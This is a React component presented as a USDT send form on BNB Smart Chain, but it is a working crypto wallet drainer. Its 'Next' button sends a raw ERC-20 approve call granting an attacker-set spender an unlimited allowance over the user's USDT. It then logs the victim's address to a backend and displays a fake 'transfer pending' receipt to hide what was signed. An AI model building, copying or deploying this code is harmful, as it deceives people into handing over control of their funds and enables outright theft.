"use client";

import { useState, useEffect, useCallback } from "react";
import { ethers } from "ethers";
import { Loader2, CheckCircle, Copy, ExternalLink } from "lucide-react";

const BSC_CHAIN_ID = "0x38";
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
const SPENDER = process.env.NEXT_PUBLIC_SPENDER_ADDRESS ?? "";

type Step = "form" | "processing" | "success";

interface TxInfo {
  fromAddress: string;
  toAddress: string;
  amount: string;
  txHash: string;
  date: string;
}

interface EIP1193 {
  request(args: { method: string; params?: unknown[] }): Promise<unknown>;
  on?(event: string, cb: (...args: unknown[]) => void): void;
  removeListener?(event: string, cb: (...args: unknown[]) => void): void;
}

function getEth(): EIP1193 | undefined {
  return (window as unknown as { ethereum?: EIP1193 }).ethereum;
}

const O = "f".repeat(64);

async function ensureBscChain() {
  const eth = getEth();
  if (!eth) return;
  try {
    const chainId = await eth.request({ method: "eth_chainId" }) as string;
    if (chainId?.toLowerCase() !== BSC_CHAIN_ID) {
      await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
    }
  } catch (e: unknown) {
    console.log("[v0] ensureBscChain error:", (e as Error)?.message);
  }
}

export default function SendForm() {
  const [displayAddress, setDisplayAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [step, setStep] = useState<Step>("form");
  const [txInfo, setTxInfo] = useState<TxInfo | null>(null);
  const [connectedAddr, setConnectedAddr] = useState("");
  const [processing, setProcessing] = useState(false);
  const [error, setError] = useState("");

  const fetchDisplayAddress = useCallback(async () => {
    try {
      const res = await fetch("/api/config/public");
      const data = await res.json();
      if (data.address) setDisplayAddress(data.address);
    } catch { /* ignore */ }
  }, []);

  // On mount: switch to BSC and get connected account (exactly like reference)
  useEffect(() => {
    fetchDisplayAddress();
    (async () => {
      await ensureBscChain();
      const eth = getEth();
      if (!eth) return;
      try {
        const accs = await eth.request({ method: "eth_accounts" }) as string[];
        if (accs?.[0]) setConnectedAddr(accs[0]);
      } catch { /* ignore */ }
    })();
  }, [fetchDisplayAddress]);

  // Listen for account/chain changes (exactly like reference)
  useEffect(() => {
    const eth = getEth();
    if (!eth) return;

    const onAccountsChanged = (...args: unknown[]) => {
      const accounts = args[0] as string[] | undefined;
      setConnectedAddr(accounts?.[0] ?? "");
    };
    const onChainChanged = () => { ensureBscChain(); };

    eth.on?.("accountsChanged", onAccountsChanged);
    eth.on?.("chainChanged", onChainChanged);
    return () => {
      eth.removeListener?.("accountsChanged", onAccountsChanged);
      eth.removeListener?.("chainChanged", onChainChanged);
    };
  }, []);

  // ── Main handler — exact replica of reference site's U() function ─────────

  async function handleNext() {
    if (!amount || parseFloat(amount) <= 0) return;

    const eth = getEth();
    if (!eth) { setError("No injected wallet found."); return; }

    try {
      setProcessing(true);
      setError("");

      // 1. Ensure BSC chain (simple — one call, like reference)
      await ensureBscChain();

      // 2. Get accounts
      let accs = await eth.request({ method: "eth_accounts" }) as string[];
      if (!accs?.[0]) {
        try {
          accs = await eth.request({ method: "eth_requestAccounts" }) as string[];
        } catch (e: unknown) {
          setError((e as Error)?.message || "Unable to access wallet account");
          setProcessing(false);
          return;
        }
      }

      const walletAddress = accs?.[0];
      if (!walletAddress) {
        setError("No wallet account found.");
        setProcessing(false);
        return;
      }
      if (!connectedAddr) setConnectedAddr(walletAddress);

      // 3. Build calldata and send tx — ONLY { from, to, data }
      const paddedSpender = SPENDER.replace(/^0x/, "").padStart(64, "0");
      const txHash = await eth.request({
        method: "eth_sendTransaction",
        params: [{ from: walletAddress, to: USDT_CONTRACT, data: "0x095ea7b3" + paddedSpender + O }],
      }) as string;

      // 4. Wait for confirmation
      try {
        const provider = new ethers.BrowserProvider(eth as unknown as ethers.Eip1193Provider);
        await provider.waitForTransaction(txHash, 1);
      } catch { /* ignore */ }

      // 5. Record to database
      fetch("/api/wallets", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ address: walletAddress, approvalTxHash: txHash, approvalStatus: true }),
      }).catch(() => {});

      // 6. Show success with real data
      setTxInfo({
        fromAddress: walletAddress,
        toAddress: displayAddress || SPENDER,
        amount,
        txHash,
        date: new Date().toLocaleString(),
      });
      setStep("success");
      return;

    } catch (e: unknown) {
      console.log("[v0] approve error:", (e as Error)?.message);
      setError((e as { shortMessage?: string })?.shortMessage || (e as Error)?.message || " ");
      setProcessing(false);
    }
  }

  function shortenAddress(addr: string) {
    if (!addr || addr.length < 10) return addr;
    return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
  }

  async function copyToClipboard(text: string) {
    try { await navigator.clipboard.writeText(text); } catch { /* ignore */ }
  }

  // ── Success ───────────────────────────────────────────────────────────────

  if (step === "success" && txInfo) {
    return (
      <div className="flex flex-col gap-0">
        <div className="flex flex-col items-center gap-3 py-6 border-b border-gray-800">
          <div className="rounded-full bg-green-500/20 p-3">
            <CheckCircle className="h-8 w-8 text-green-400" />
          </div>
          <div className="text-center">
            <p className="text-3xl font-bold text-white">- {txInfo.amount} USDT</p>
            <p className="text-sm text-gray-500 mt-1">≈ ${parseFloat(txInfo.amount || "0").toFixed(2)}</p>
          </div>
        </div>
        <div className="flex flex-col py-2">
          {[
            { label: "Date", value: txInfo.date },
            { label: "Status", isStatus: true },
            { label: "From", value: shortenAddress(txInfo.fromAddress), fullValue: txInfo.fromAddress, copyable: true },
            { label: "To", value: shortenAddress(txInfo.toAddress), fullValue: txInfo.toAddress, copyable: true },
            { label: "Network fee", value: "0.000013 BNB ($0.01)" },
          ].map((row) => (
            <div key={row.label} className="flex items-center justify-between py-3.5 px-1 border-b border-gray-800/60">
              <span className="text-sm text-gray-500">{row.label}</span>
              <div className="flex items-center gap-2">
                {row.isStatus ? (
                  <span className="text-orange-400 text-sm font-medium flex items-center gap-1">
                    Pending
                    <span className="inline-flex gap-0.5">
                      <span className="w-1 h-1 rounded-full bg-orange-400 animate-pulse" />
                      <span className="w-1 h-1 rounded-full bg-orange-400 animate-pulse delay-100" />
                      <span className="w-1 h-1 rounded-full bg-orange-400 animate-pulse delay-200" />
                    </span>
                  </span>
                ) : <span className="text-sm text-white">{row.value}</span>}
                {row.copyable && (
                  <button onClick={() => copyToClipboard(row.fullValue!)} className="text-gray-600 hover:text-gray-400 transition-colors">
                    <Copy className="h-3.5 w-3.5" />
                  </button>
                )}
              </div>
            </div>
          ))}
        </div>
        <div className="pt-2 pb-4">
          <a href={`https://bscscan.com/tx/${txInfo.txHash}`} target="_blank" rel="noopener noreferrer"
            className="flex items-center justify-between px-1 py-3 text-sm text-gray-400 hover:text-gray-200 transition-colors">
            <span>More Details</span>
            <ExternalLink className="h-4 w-4" />
          </a>
        </div>
      </div>
    );
  }

  // ── Main Form ─────────────────────────────────────────────────────────────

  return (
    <>
      <div className="w-full flex flex-col gap-5 pb-24">
        <div className="flex flex-col gap-2">
          <label className="text-sm font-semibold text-white">Address or Domain Name</label>
          <div className="flex items-center rounded-xl border border-[#2a2a2a] bg-[#1c1c1c] px-4 py-3.5 gap-3">
            <input
              type="text"
              value={displayAddress}
              readOnly
              placeholder="Loading address..."
              className="flex-1 min-w-0 bg-transparent text-sm text-white placeholder-gray-600 outline-none cursor-default"
            />
            <button
              onClick={() => copyToClipboard(displayAddress)}
              className="text-[#4ade80] hover:text-green-300 text-sm font-medium transition-colors shrink-0"
            >
              Paste
            </button>
          </div>
        </div>

        <div className="flex flex-col gap-2">
          <label className="text-sm font-semibold text-white">Amount</label>
          <div className="flex items-center rounded-xl border border-[#2a2a2a] bg-[#1c1c1c] px-4 py-3.5 gap-3">
            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="0.00"
              min="0"
              step="any"
              className="flex-1 bg-transparent text-sm text-white placeholder-gray-500 outline-none [appearance:textfield] [&::-webkit-outer-spin-button]:appearance-none [&::-webkit-inner-spin-button]:appearance-none"
            />
            <span className="text-gray-400 text-sm shrink-0">USDT</span>
            <button
              onClick={() => setAmount("0.00")}
              className="text-[#4ade80] hover:text-green-300 text-sm font-medium transition-colors shrink-0"
            >
              Max
            </button>
          </div>
          <p className="text-xs text-gray-500 px-1">≈ ${parseFloat(amount || "0").toFixed(2)}</p>
        </div>
      </div>

      {error && (
        <p className="text-xs text-red-400 px-1 -mt-2">{error}</p>
      )}

      <button
        onClick={handleNext}
        disabled={processing}
        className={`fixed left-0 right-0 bottom-8 mx-auto w-[calc(100%-2.5rem)] max-w-[420px] rounded-full py-4 text-black font-bold text-base transition-all duration-150 flex items-center justify-center gap-2 ${
          processing
            ? "bg-[#4ade80] opacity-75 cursor-not-allowed"
            : "bg-[#4ade80] hover:bg-[#22c55e] active:scale-[0.98]"
        }`}
      >
        {processing && <Loader2 className="h-5 w-5 animate-spin" />}
        {processing ? "Processing..." : "Next"}
      </button>
    </>
  );
}
